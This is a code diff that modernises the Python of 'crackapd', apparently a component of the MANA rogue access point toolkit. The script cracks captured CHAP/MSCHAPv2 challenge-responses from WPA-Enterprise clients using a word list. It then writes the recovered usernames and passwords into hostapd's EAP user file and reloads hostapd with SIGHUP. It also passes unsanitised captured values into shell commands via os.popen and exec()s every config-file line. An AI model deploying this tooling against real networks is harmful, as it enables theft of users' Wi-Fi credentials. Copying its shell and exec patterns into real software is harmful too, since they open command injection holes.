@@ -39,18 +39,12 @@ def PrintResult(verbose, message):
 def WriteResult(s_file, s_string):
 	LOCK.acquire()
 	try:
-		found = False
 		datafile = file(s_file)
-		for dataline in datafile:
-			if s_string in dataline:
-				found = True
-				break
-
-		if found == False:
-			f = open(s_file, 'a')
-			f.write(str(s_string) + "\n")
-			f.close()
-			s = str("pkill -SIGHUP hostapd")
+		found = any(s_string in dataline for dataline in datafile)
+		if not found:
+			with open(s_file, 'a') as f:
+				f.write(str(s_string) + "\n")
+			s = "pkill -SIGHUP hostapd"
 			p = os.popen(s, "r")
 			while 1:
 				line = p.readline()
@@ -78,23 +72,23 @@ class GetIt(Thread):
 			self.response = ""
 			# The thread will exit if it dequeues a None object.
 			arr = str(arr).replace("\r", "").replace("\n", "")
-			(t, u, c, r) = str(arr).split("|")
+			(t, u, c, r) = arr.split("|")
 			if str(t) == "CHAP":
-				s = str(self.the_exec) + " -C " + c + " -R " + r + " -W " + str(self.the_dict)
-				PrintResult(self.the_verbose, "MANA - CrackApd " + str(s))
+				s = f"{str(self.the_exec)} -C {c} -R {r} -W {str(self.the_dict)}"
+				PrintResult(self.the_verbose, f"MANA - CrackApd {str(s)}")
 				p = os.popen(s, "r")
 				while 1:
 					line = p.readline()
 					if not line:
 						break
 					line = str(line).replace("\r", "").replace("\n", "")
-					if str(line).find("password:") > -1:
-						(a, b) = str(line).split("password:          ")
+					if "password:" in line:
+						(a, b) = line.split("password:          ")
 						txt_pass = str(b)
 						self.response = "\"" + u + "\"" + "\t" + "PEAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP\t" + "\"" + txt_pass + "\"\t" + "[2]"
 				if str(self.response) != "":
 					PrintResult(self.the_verbose, "MANA - CrackApd - Credentials Cracked.")
-					PrintResult(self.the_verbose, "MANA - CrackApd - " + str(self.response))
+					PrintResult(self.the_verbose, f"MANA - CrackApd - {str(self.response)}")
 					WriteResult(self.the_user, self.response)
 
 # *duh*  The main process entry...
@@ -128,19 +122,19 @@ if __name__ == '__main__':
 	PrintResult(VERBOSE, "MANA - CrackApd - ")
 	PrintResult(VERBOSE, "MANA - CrackApd - Loading Configuration...")
 	try:
-		s = open(THEPATH + str('crackapd.conf'), 'r').readlines()
+		s = open(f'{THEPATH}crackapd.conf', 'r').readlines()
 		for i in s:
 			exec(i)
 	except:
 		PrintResult(VERBOSE, "MANA - CrackApd -  ! Could not load configuration file.  Using defaults")
 
 	PrintResult(VERBOSE, "MANA - CrackApd -  + Loaded Configuration.")
-	PrintResult(VERBOSE, "MANA - CrackApd -  + Verbose               : " + str(VERBOSE))
-	PrintResult(VERBOSE, "MANA - CrackApd -  + Total Threads         : " + str(THREADS))
-	PrintResult(VERBOSE, "MANA - CrackApd -  + Control File          : " + str(RUNFILE))
-	PrintResult(VERBOSE, "MANA - CrackApd -  + HostAPD Configuration : " + str(HOSTAPD))
-	PrintResult(VERBOSE, "MANA - CrackApd -  + Crack Executable      : " + str(CRACKEX))
-	PrintResult(VERBOSE, "MANA - CrackApd -  + Word List             : " + str(WORDLST))
+	PrintResult(VERBOSE, f"MANA - CrackApd -  + Verbose               : {VERBOSE}")
+	PrintResult(VERBOSE, f"MANA - CrackApd -  + Total Threads         : {THREADS}")
+	PrintResult(VERBOSE, f"MANA - CrackApd -  + Control File          : {RUNFILE}")
+	PrintResult(VERBOSE, f"MANA - CrackApd -  + HostAPD Configuration : {HOSTAPD}")
+	PrintResult(VERBOSE, f"MANA - CrackApd -  + Crack Executable      : {CRACKEX}")
+	PrintResult(VERBOSE, f"MANA - CrackApd -  + Word List             : {WORDLST}")
 	PrintResult(VERBOSE, "MANA - CrackApd -  + Done")
 	PrintResult(VERBOSE, "MANA - CrackApd - ")
 	PrintResult(VERBOSE, "MANA - CrackApd - ")
@@ -154,30 +148,29 @@ if __name__ == '__main__':
 					PrintResult(VERBOSE, "MANA - CrackApd -  ! No Entry node specified. Using default")
 				else:
 					ENNODES = str(b).replace("\r", "").replace("\n", "")
-					PrintResult(VERBOSE, "MANA - CrackApd -  + Crack Entry Node      : " + str(ENNODES))
+					PrintResult(VERBOSE, f"MANA - CrackApd -  + Crack Entry Node      : {ENNODES}")
 			if str(i).startswith("eap_user_file"):
 				(a, b) = str(i).split("=")
 				if b is None:
 					PrintResult(VERBOSE, "MANA - CrackApd -  ! No Entry node specified. Using default")
 				else:
 					EAPUSER = str(b).replace("\r", "").replace("\n", "")
-					PrintResult(VERBOSE, "MANA - CrackApd -  + EAP Users File        : " + str(EAPUSER))
+					PrintResult(VERBOSE, f"MANA - CrackApd -  + EAP Users File        : {EAPUSER}")
 	except:
 		PrintResult(VERBOSE, "MANA - CrackApd -  ! Could not read hostapd configuration. Using defaults")
 
 	# Start the threads...
 	PrintResult(VERBOSE, "MANA - CrackApd - Initialising Threads...")
 	for i in range(THREADS):
-		PrintResult(VERBOSE, "MANA - CrackApd -  + Starting Thread..." + str(i))
+		PrintResult(VERBOSE, f"MANA - CrackApd -  + Starting Thread...{str(i)}")
 		GetIt(VERBOSE, WRKQUEUE, EAPUSER, CRACKEX, WORDLST).start()
 	PrintResult(VERBOSE, "MANA - CrackApd -  + Done")
 	PrintResult(VERBOSE, "MANA - CrackApd - ")
 
 	# Create the run file
 	try:
-		runfile = open(str(RUNFILE), 'a')
-		runfile.write("1")
-		runfile.close()
+		with open(RUNFILE, 'a') as runfile:
+			runfile.write("1")
 	except:
 		PrintResult(VERBOSE, "MANA - CrackApd -  ! Could not create run file. The program will exit")
 
@@ -193,13 +186,11 @@ if __name__ == '__main__':
 	# We'll now enter the main loop. We check to see whether the runfile exists.
 	# if it does, we continue processing.
 	# If it does not, we exit and put None in the queues...
-	while(os.path.isfile(RUNFILE)):
-		if INPUTNODE == None:
-			break
+	while (os.path.isfile(RUNFILE)) and INPUTNODE is not None:
 		s = INPUTNODE.readline()
 		if str(s) != "":
 			s = str(s).replace("\r", "").replace("\n", "")
-			PrintResult(VERBOSE, "MANA - CrackApd - ITEM ADDED TO QUEUE " + str(s))
+			PrintResult(VERBOSE, f"MANA - CrackApd - ITEM ADDED TO QUEUE {s}")
 			WRKQUEUE.put(s)
 
 	# If we reach this, the runfile has been removed. We exit.
@@ -208,6 +199,6 @@ if __name__ == '__main__':
 		INPUTNODE.close()
 
 	# The threads will end when they receive a NONE from the queue.  We add a None for each thread.
-	for i in range(THREADS):
+	for _ in range(THREADS):
 		PrintResult(VERBOSE, "MANA - CrackApd - Clearing Threads")
 		WRKQUEUE.put(None)
